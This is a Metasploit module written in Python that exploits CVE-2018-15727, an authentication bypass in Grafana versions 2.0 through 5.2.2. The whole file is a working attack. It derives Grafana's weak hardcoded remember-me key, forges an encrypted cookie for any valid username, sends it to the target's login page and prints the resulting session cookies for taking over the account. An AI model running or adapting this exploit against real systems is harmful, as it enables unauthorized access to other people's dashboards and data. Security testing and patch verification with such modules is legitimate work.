#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import requests 
import binascii
import hashlib
import logging
import os
import re

from metasploit import module


metadata = {
    'name': 'Grafana 2.0 through 5.2.2 authentication bypass for LDAP and OAuth',
    'description': '''
        This module generates a remember me cookie for a valid username. Through unpropper seeding 
        while userdate are requested from LDAP or OAuth it's possible to craft a valid remember me cookie. 
        This cookie can be used for bypass authentication for everyone knowing a valid username.
    ''',
    'authors': [
        'Rene Riedling',
        'Sebastian Solnica' #Original Discovered
    ],
    'date': '2019-08-14', # set to date of creation
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'cve', 'ref': '2018-15727'},
        {'type': 'url', 'ref': 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15727'},
        {'type': 'url', 'ref': 'https://grafana.com/blog/2018/08/29/grafana-5.2.3-and-4.6.4-released-with-important-security-fix/'}
    ],
    'type': 'single_scanner',
    'options': {
        'VERSION': {'type': 'string', 'description': 'Grafana version', 'required': True, 'default': '5'},
        'USERNAME': {'type': 'string', 'description': 'Valid username', 'required': False},
        'RHOSTS': {'type': 'address', 'description': 'Address of target', 'required': True, 'default': '127.0.0.1'},
        'RPORT': {'type': 'port', 'description': 'Port of target', 'required': True, 'default': 3000},
        'COOKIE': {'type': 'string', 'description': 'Decrypt captured cookie', 'required': False},
        'BASEURL': {'type': 'string', 'description': 'Base URL of grafana instance', 'required': False, 'default' : '/'},
        'SSL': {'type': 'bool', 'description': 'set SSL/TLS based connection', 'required': True, 'default' : False}
    }
}


def encrypt_version5(username):
    
    salt = b''
    iterations = 1000
    key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    username = username.encode()
    ct = aesgcm.encrypt(nonce, username, None)
    cookie = str(binascii.hexlify(nonce),'ascii')+str(binascii.hexlify(ct),'ascii')
    return cookie


def encrypt_version4(username):

    salt = hashlib.md5(''.encode("utf-8")).hexdigest().encode()
    iterations = 1000
    key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    username = username.encode()
    ct = aesgcm.encrypt(nonce, username, None)
    cookie = str(binascii.hexlify(nonce),'ascii')+str(binascii.hexlify(ct),'ascii')
    return cookie


def decrypt_version5(cookie):
    
    salt = b''
    iterations = 1000
    key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
    aesgcm = AESGCM(key)
    nonce = binascii.unhexlify(cookie[:24])
    ct = binascii.unhexlify(cookie[24:len(cookie)])
    username = str(aesgcm.decrypt(nonce, ct, None),'ascii')
    return username


def decrypt_version4(cookie):

    salt = hashlib.md5(''.encode("utf-8")).hexdigest().encode()
    iterations = 1000
    key = hashlib.pbkdf2_hmac('sha256', salt, salt, iterations, 16)
    aesgcm = AESGCM(key)
    nonce = binascii.unhexlify(cookie[:24])
    ct = binascii.unhexlify(cookie[24:len(cookie)])
    username = str(aesgcm.decrypt(nonce, ct, None),'ascii')
    return username




def run(args):
   

    if int(args['VERSION']) == 5:
        try:    
            username = args['USERNAME']
            cookie = encrypt_version5(args['USERNAME'])
            module.log("Encrypted remember cookie: "+cookie, "good")
        except:
            module.log("No username set, trying to decrypt it from cookie.", "warning")
            try:
                username = decrypt_version5(args['COOKIE'])
                module.log("Decrypted username: "+username, "good")
                cookie = args['COOKIE']
            except:
                module.log("Unable to set username", "error")
                return
    elif int(args['VERSION']) <= 4 and int(args['VERSION']) >= 2:
        try:    
            username = args['USERNAME']
            cookie = encrypt_version4(args['USERNAME'])
            module.log("Encrypted remember cookie: "+cookie, "good")
        except:
            module.log("No username set, trying to decrypt it from cookie.", "warning")
            try:
                username = decrypt_version4(args['COOKIE'])
                module.log("Decrypted username: "+username, "good")
                cookie = args['COOKIE']
            except:
                module.log("Unable to set username", "error")
                return
    else:
        module.log("Version not supported.","error")


    try:
        cookies = { 'grafana_remember':cookie, 'grafana_user':username }
        
        if args['SSL'] == "false":
            if args['BASEURL'].endswith('/'): 
                url="http://"+args['RHOSTS']+":"+args['RPORT']+args['BASEURL']+"login/"
            else:
                url="http://"+args['RHOSTS']+":"+args['RPORT']+args['BASEURL']+"/login/"
        elif args['SSL'] == "true":
            if args['BASEURL'].endswith('/'): 
                url="https://"+args['RHOSTS']+":"+args['RPORT']+args['BASEURL']+"login/"
            else:
                url="https://"+args['RHOSTS']+":"+args['RPORT']+args['BASEURL']+"/login/"
        module.log(url, "error")
        r = requests.get(url=url, cookies=cookies, allow_redirects=False)
    
    except:
        module.log("Failed to sending request to host.", "error")
        return


    if r.status_code == 302:
        try:
            grafana_user = re.search(r"grafana_user=.*?;",r.headers['Set-Cookie']).group(0)
            grafana_remember = re.search(r"grafana_remember=.*?;",r.headers['Set-Cookie']).group(0)
            grafana_sess = re.search(r"grafana_sess=.*?;",r.headers['Set-Cookie']).group(0)
    
            module.log("Set following cookies to get access to the grafana instance.","good")
            module.log(grafana_user,"good")
            module.log(grafana_remember,"good")
            module.log(grafana_sess,"good")
        except: 
            module.log("Failed to generate cookies out of request.", "error")
            return
    else:
        module.log("Target is not vulnerable.","warning")
        return



if __name__ == '__main__':
    module.run(metadata, run)
